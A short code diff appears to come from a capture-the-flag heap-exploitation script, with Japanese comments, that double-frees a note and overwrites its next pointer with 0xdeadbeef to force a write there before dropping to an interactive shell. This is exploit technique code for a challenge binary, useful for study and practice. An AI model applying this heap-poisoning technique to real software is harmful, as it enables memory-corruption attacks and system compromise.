@@ -91,9 +91,6 @@ HOST, PORT = '127.0.0.1', 1337
     # $socat TCP-LISTEN:1337,reuseaddr,fork exec:./main.sh
     gdbserver localhost:1234 ./<chall_binary>
 """
-if len(sys.argv) == 2 and sys.argv[1] == 'r':
-  banner = 'remote'
-  HOST, PORT = '<remote-host>', 1337
 
 logging.info(banner)
 s, f = sock(HOST, PORT)
@@ -101,7 +98,7 @@ A = create_note(0x10, b'A' * 0x0f)
 delete_note(A)
 delete_note(A)
 B = create_note(0x10, pQ(0xdeadbeef)) # nextメンバ書き換え
+C = create_note(0x10, b'\n') # リストの先頭にnextが0xdeadbeefを向いたチャンクが繋がっている. 
 input('GDB?')
-C = create_note(0x1, b'\x00') # リストの先頭にnextが0xdeadbeefを向いたチャンクが繋がっている. 
-D = create_note(0x1, b'\x00') # 0xdeadbeefへ書き込もうとしてSIGSEGV 
+D = create_note(0x10, b'SIGSEGV') # 0xdeadbeefへ書き込もうとしてSIGSEGV 
 shell(s)
